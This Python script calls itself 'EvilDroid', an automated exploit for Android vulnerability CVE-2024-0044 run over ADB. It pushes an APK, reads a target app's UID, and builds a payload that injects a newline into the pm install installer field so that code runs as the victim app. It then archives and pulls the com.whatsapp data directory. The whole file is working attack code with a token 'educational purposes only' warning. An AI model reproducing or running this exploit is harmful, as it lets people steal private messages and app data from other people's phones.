import argparse
import subprocess
import os
import sys
import time

GREEN = "\033[32m"
CYAN = "\033[36m"
BOLD = "\033[1m"
RESET = "\033[0m"
CHECK_MARK = "\u2714"
ERROR_MARK = "\u2716"
RED = "\033[31m"


class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter):
    pass

def display_banner():
    print(f'''{RED}                                                                               
 ██████████              ███  ████  ██████████                       ███      █████
░░███░░░░░█             ░░░  ░░███ ░░███░░░░███                     ░░░      ░░███ 
 ░███  █ ░  █████ █████ ████  ░███  ░███   ░░███ ████████   ██████  ████   ███████ 
 ░██████   ░░███ ░░███ ░░███  ░███  ░███    ░███░░███░░███ ███░░███░░███  ███░░███ 
 ░███░░█    ░███  ░███  ░███  ░███  ░███    ░███ ░███ ░░░ ░███ ░███ ░███ ░███ ░███ 
 ░███ ░   █ ░░███ ███   ░███  ░███  ░███    ███  ░███     ░███ ░███ ░███ ░███ ░███ 
 ██████████  ░░█████    █████ █████ ██████████   █████    ░░██████  █████░░████████
░░░░░░░░░░    ░░░░░    ░░░░░ ░░░░░ ░░░░░░░░░░   ░░░░░      ░░░░░░  ░░░░░  ░░░░░░░░ 
                                                        
                                                                    Code By @nexussecelite                       {RED}{BOLD}''')

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def warning_message():
    """Display a warning message before starting the tool."""
    print(f"{CYAN}{BOLD}[{ERROR_MARK}] WARNING: This tool is for educational purposes only. Unauthorized use is illegal and unethical.")
    print(f"{CYAN}{BOLD}[{ERROR_MARK}] Please ensure you have explicit permission to use this tool on any device or system.")
    time.sleep(5)  # Wait for 5 seconds to let the user read the warning

def check_adb_connection():
    try:
        result = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
        if 'device' not in result.stdout:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] No devices connected. Please connect your device and try again.")
            sys.exit(1)
        print(f"{CYAN}{BOLD}[{CHECK_MARK}] ADB connection established.")
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred while checking ADB connection: {e}")
        sys.exit(1)

def push_apk(apk_path):
    try:
        if not os.path.isfile(apk_path):
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] APK file '{apk_path}' does not exist.")
            return False

        result = subprocess.run(['adb', 'push', apk_path, '/data/local/tmp/'], capture_output=True, text=True)

        if result.returncode != 0:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Error: {result.stderr.strip()}")
            return False

        print(f"{CYAN}{BOLD}[{CHECK_MARK}] Successfully pushed '{GREEN}{apk_path}{CYAN}' to '{GREEN}/data/local/tmp/{os.path.basename(apk_path)}{CYAN}'")
        return True
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred: {e}")
        return False

def get_app_uid(package_name):
    try:
        result = subprocess.run(['adb', 'shell', f'pm list packages -U | grep {package_name}'], capture_output=True, text=True)

        if result.returncode != 0:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Error: {result.stderr.strip()}")
            return None

        for line in result.stdout.splitlines():
            if f'package:{package_name} uid:' in line:
                uid = line.split('uid:')[1].strip()
                print(f"{CYAN}{BOLD}[{CHECK_MARK}] Got the target UID for {GREEN}{package_name}{CYAN} : {GREEN}{uid}{CYAN}")
                return uid
        return None
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred: {e}")
        return None

def generate_payload(uid, apk_filename):
    try:
        payload = f"PAYLOAD=\"@null\nvictim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null\"\npm install -i \"$PAYLOAD\" /data/local/tmp/{apk_filename}"
        with open('payload.txt', 'w') as f:
            f.write(payload)
        print(f"{CYAN}{BOLD}[{CHECK_MARK}] Payload generated and saved to: {GREEN}'payload.txt'{CYAN}")
        print(f"{GREEN}{payload}{CYAN}")
        run_extraction()
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred: {e}")

def run_extraction():
    commands = [
        'mkdir -p /data/local/tmp/wa/',
        'chmod -R 0777 /data/local/tmp/wa/',
        'tar -cf /data/local/tmp/wa/wa.tar com.whatsapp'
    ]
    
    print(f"{CYAN}{BOLD}[{CHECK_MARK}] Executing extraction commands...")
    for command in commands:
        full_command = f"adb shell {command}"
        try:
            result = subprocess.run(full_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"{CYAN}{BOLD}[{CHECK_MARK}] Command '{command}' executed successfully: {result.stdout.decode().strip()}")
        except subprocess.CalledProcessError as e:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Error executing command '{command}': {e.stderr.decode().strip()}")

    pull_with_progress("wa.tar")

def pull_with_progress(filename, device_path="/data/local/tmp/wa/wa.tar"):
    try:
        result = subprocess.run(['adb', 'shell', f'du -b {device_path}'], capture_output=True, text=True)
        filesize = int(result.stdout.split()[0])
        print(f"{CYAN}{BOLD}[{CHECK_MARK}] Downloading file: {GREEN}{filename}{CYAN} (size: {GREEN}{filesize}{CYAN} bytes)")

        with open(filename, "wb") as f:
            process = subprocess.Popen(["adb", "shell", "cat", device_path], stdout=subprocess.PIPE)
            received = 0
            total_bars = 20
            while True:
                data = process.stdout.read(1024)
                if not data:
                    break
                received += len(data)
                f.write(data)
                percent = int((received / filesize) * 100)
                bars = int((received / filesize) * total_bars)
                progress_bar = f"[{'=' * bars}{' ' * (total_bars - bars)}] {percent}%"
                print(f"\r{CYAN}{BOLD}{progress_bar}{RESET}", end="")
        print(f"\n{CYAN}{BOLD}[{CHECK_MARK}] Download complete: {GREEN}{filename}{CYAN}")
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred during file download: {e}")

def main():
    clear_screen()
    display_banner()
    warning_message()
    print(f"{CYAN}{BOLD}[{CHECK_MARK}] Waiting for ADB device...")
    check_adb_connection()
    print(f"{CYAN}{BOLD}[{CHECK_MARK}] ADB device found. Starting exploit...")

    parser = argparse.ArgumentParser(
        description='EvilDroid: Automated Exploit for CVE-2024-0044',
        formatter_class=CustomFormatter,
        epilog="Use this script responsibly. Discovered by Meta Security."
    )
    parser.add_argument('-p', '--package', required=True, help='Target package name (e.g., com.whatsapp)')
    parser.add_argument('-a', '--apk', required=True, help='Path to the APK file to install')

    args = parser.parse_args()

    if push_apk(args.apk):
        uid = get_app_uid(args.package)
        if uid:
            generate_payload(uid, os.path.basename(args.apk))
        else:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Failed to get UID for package '{args.package}'.")
    else:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] Failed to push APK file.")

try:
    main()
except KeyboardInterrupt:
    clear_screen()
    print("Exited Forcefully")       
    sys.exit(0)
